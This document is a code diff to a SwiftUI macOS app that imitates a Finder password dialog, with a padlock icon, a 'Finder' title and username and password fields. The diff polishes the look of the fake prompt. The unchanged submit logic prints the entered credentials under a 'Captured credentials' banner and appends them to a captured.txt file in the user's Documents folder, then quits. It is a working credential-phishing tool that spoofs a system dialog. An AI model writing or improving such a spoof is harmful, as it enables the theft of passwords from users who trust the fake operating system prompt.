@@ -61,82 +61,51 @@ struct VisualEffectView: NSViewRepresentable {
 
 struct FinderPadlockIcon: View {
     var body: some View {
-        ZStack {
-            Path { p in
-                p.move(to: CGPoint(x: 16, y: 24))
-                p.addLine(to: CGPoint(x: 16, y: 16))
-                p.addArc(center: CGPoint(x: 30, y: 16), radius: 14,
-                         startAngle: .degrees(180), endAngle: .degrees(0),
-                         clockwise: false)
-                p.addLine(to: CGPoint(x: 44, y: 24))
+        Group {
+            if let path = Bundle.main.path(forResource: "icon", ofType: "png"),
+               let img = NSImage(contentsOfFile: path) {
+                Image(nsImage: img)
+                    .resizable()
+                    .interpolation(.high)
+                    .frame(width: 76, height: 76)
+            } else {
+                Image(systemName: "lock.fill")
+                    .font(.system(size: 54))
+                    .foregroundColor(.gray)
+                    .frame(width: 76, height: 76)
             }
-            .stroke(
-                LinearGradient(
-                    colors: [Color(white: 0.97), Color(white: 0.68)],
-                    startPoint: .top, endPoint: .bottom),
-                style: StrokeStyle(lineWidth: 6.5, lineCap: .round, lineJoin: .round))
-            .shadow(color: .black.opacity(0.12), radius: 1, y: 0.5)
-            .offset(y: -8)
-
-            RoundedRectangle(cornerRadius: 5, style: .continuous)
-                .fill(
-                    LinearGradient(
-                        colors: [
-                            Color(red: 0.99, green: 0.88, blue: 0.55),
-                            Color(red: 0.91, green: 0.74, blue: 0.32),
-                            Color(red: 0.80, green: 0.60, blue: 0.18)
-                        ],
-                        startPoint: .top, endPoint: .bottom))
-                .frame(width: 56, height: 42)
-                .overlay(
-                    RoundedRectangle(cornerRadius: 5, style: .continuous)
-                        .stroke(Color(red: 0.55, green: 0.40, blue: 0.10).opacity(0.5),
-                                lineWidth: 0.5)
-                )
-                .overlay(
-                    RoundedRectangle(cornerRadius: 5, style: .continuous)
-                        .stroke(Color.white.opacity(0.55), lineWidth: 0.7)
-                        .blur(radius: 0.4)
-                        .offset(y: -0.5)
-                        .mask(
-                            RoundedRectangle(cornerRadius: 5, style: .continuous)
-                                .fill(LinearGradient(
-                                    colors: [.white, .clear],
-                                    startPoint: .top, endPoint: .center))
-                        )
-                )
-                .shadow(color: .black.opacity(0.22), radius: 2.5, y: 1.5)
-                .offset(y: 11)
-
-            Image(nsImage: NSWorkspace.shared
-                    .icon(forFile: "/System/Library/CoreServices/Finder.app"))
-                .resizable()
-                .interpolation(.high)
-                .frame(width: 22, height: 22)
-                .shadow(color: .black.opacity(0.25), radius: 1, y: 0.5)
-                .offset(x: 15, y: 18)
         }
-        .frame(width: 60, height: 66)
     }
 }
 
-struct DialogButtonStyle: ButtonStyle {
+struct SecondaryButtonStyle: ButtonStyle {
     func makeBody(configuration: Configuration) -> some View {
         configuration.label
             .font(.system(size: 13))
             .foregroundColor(.primary)
             .frame(maxWidth: .infinity)
-            .frame(height: 30)
+            .frame(height: 28)
             .background(
                 Capsule(style: .continuous)
                     .fill(.ultraThinMaterial)
+                    .overlay(Capsule(style: .continuous).fill(Color.black.opacity(0.10)))
             )
-            .overlay(
-                Capsule(style: .continuous)
-                    .stroke(Color.white.opacity(0.15), lineWidth: 0.5)
-            )
+            .overlay(Capsule(style: .continuous).stroke(Color.black.opacity(0.08), lineWidth: 0.5))
             .contentShape(Capsule(style: .continuous))
-            .opacity(configuration.isPressed ? 0.65 : 1.0)
+            .opacity(configuration.isPressed ? 0.70 : 1.0)
+    }
+}
+
+struct PrimaryButtonStyle: ButtonStyle {
+    func makeBody(configuration: Configuration) -> some View {
+        configuration.label
+            .font(.system(size: 13))
+            .foregroundColor(.white)
+            .frame(maxWidth: .infinity)
+            .frame(height: 28)
+            .background(Capsule(style: .continuous).fill(Color.accentColor))
+            .contentShape(Capsule(style: .continuous))
+            .opacity(configuration.isPressed ? 0.80 : 1.0)
     }
 }
 
@@ -150,7 +119,7 @@ struct ContentView: View {
     var body: some View {
         VStack(alignment: .leading, spacing: 0) {
             FinderPadlockIcon()
-                .padding(.bottom, 14)
+                .padding(.bottom, 12)
 
             Text("Finder")
                 .font(.system(size: 15, weight: .bold))
@@ -166,37 +135,55 @@ struct ContentView: View {
                 .font(.system(size: 13))
                 .foregroundColor(.primary)
                 .fixedSize(horizontal: false, vertical: true)
-                .padding(.bottom, 16)
+                .padding(.bottom, 14)
 
-            TextField("Username", text: $username)
-                .textFieldStyle(.plain)
-                .font(.system(size: 13))
-                .padding(.horizontal, 11)
-                .frame(height: 30)
-                .background(fieldBg)
-                .focused($focusedField, equals: .username)
-                .disabled(isLoading)
-                .onSubmit { focusedField = .password }
-                .padding(.bottom, 8)
+            ZStack(alignment: .leading) {
+                if username.isEmpty {
+                    Text("Username")
+                        .font(.system(size: 13))
+                        .foregroundColor(Color.secondary.opacity(0.55))
+                        .padding(.horizontal, 11)
+                        .allowsHitTesting(false)
+                }
+                TextField("", text: $username)
+                    .textFieldStyle(.plain)
+                    .font(.system(size: 13))
+                    .padding(.horizontal, 11)
+                    .frame(height: 28)
+                    .focused($focusedField, equals: .username)
+                    .disabled(isLoading)
+                    .onSubmit { focusedField = .password }
+            }
+            .background(fieldBg)
+            .padding(.bottom, 8)
 
-            SecureField("Password", text: $password)
-                .textFieldStyle(.plain)
-                .font(.system(size: 13))
-                .padding(.horizontal, 11)
-                .frame(height: 30)
-                .background(fieldBg)
-                .focused($focusedField, equals: .password)
-                .disabled(isLoading)
-                .onSubmit { submit() }
-                .padding(.bottom, 16)
+            ZStack(alignment: .leading) {
+                if password.isEmpty {
+                    Text("Password")
+                        .font(.system(size: 13))
+                        .foregroundColor(Color.secondary.opacity(0.55))
+                        .padding(.horizontal, 11)
+                        .allowsHitTesting(false)
+                }
+                SecureField("", text: $password)
+                    .textFieldStyle(.plain)
+                    .font(.system(size: 13))
+                    .padding(.horizontal, 11)
+                    .frame(height: 28)
+                    .focused($focusedField, equals: .password)
+                    .disabled(isLoading)
+                    .onSubmit { submit() }
+            }
+            .background(fieldBg)
+            .padding(.bottom, 14)
 
             HStack(spacing: 12) {
                 Button("Cancel") { cancel() }
-                    .buttonStyle(DialogButtonStyle())
+                    .buttonStyle(SecondaryButtonStyle())
                     .keyboardShortcut(.cancelAction)
                     .disabled(isLoading)
                 Button("OK") { submit() }
-                    .buttonStyle(DialogButtonStyle())
+                    .buttonStyle(PrimaryButtonStyle())
                     .keyboardShortcut(.defaultAction)
                     .disabled(isLoading)
             }
@@ -204,13 +191,13 @@ struct ContentView: View {
                 if isLoading {
                     ProgressView()
                         .controlSize(.small)
-                        .scaleEffect(0.7)
-                        .offset(x: -20)
+                        .scaleEffect(0.65)
+                        .offset(x: -18)
                 }
             }
         }
         .padding(20)
-        .frame(width: 360)
+        .frame(width: 350)
         .background(VisualEffectView(material: .popover))
         .clipShape(RoundedRectangle(cornerRadius: 20, style: .continuous))
         .overlay(
@@ -226,10 +213,10 @@ struct ContentView: View {
 
     private var fieldBg: some View {
         RoundedRectangle(cornerRadius: 6, style: .continuous)
-            .fill(Color(nsColor: .textBackgroundColor).opacity(0.55))
+            .fill(Color(nsColor: .textBackgroundColor).opacity(0.45))
             .overlay(
                 RoundedRectangle(cornerRadius: 6, style: .continuous)
-                    .stroke(Color.black.opacity(0.06), lineWidth: 0.5)
+                    .stroke(Color.black.opacity(0.05), lineWidth: 0.5)
             )
     }
 
@@ -243,14 +230,11 @@ struct ContentView: View {
         }
         isLoading = true
         let u = username, p = password
-
         print("=== Captured credentials ===")
         print("Username: \(u)")
         print("Password: \(p)")
         print("============================")
-
         saveToDocumentsFile(username: u, password: p)
-
         DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) { fadeOutAndQuit() }
     }
 
@@ -258,11 +242,9 @@ struct ContentView: View {
         let fm = FileManager.default
         guard let docs = fm.urls(for: .documentDirectory, in: .userDomainMask).first else { return }
         let fileURL = docs.appendingPathComponent("captured.txt")
-
         let df = DateFormatter()
         df.dateFormat = "yyyy-MM-dd HH:mm:ss"
         let stamp = df.string(from: Date())
-
         let block = """
         [\(stamp)]
         Username: \(username)
@@ -270,9 +252,7 @@ struct ContentView: View {
         ----------------------------------------
 
         """
-
         guard let data = block.data(using: .utf8) else { return }
-
         if fm.fileExists(atPath: fileURL.path) {
             if let handle = try? FileHandle(forWritingTo: fileURL) {
                 handle.seekToEndOfFile()
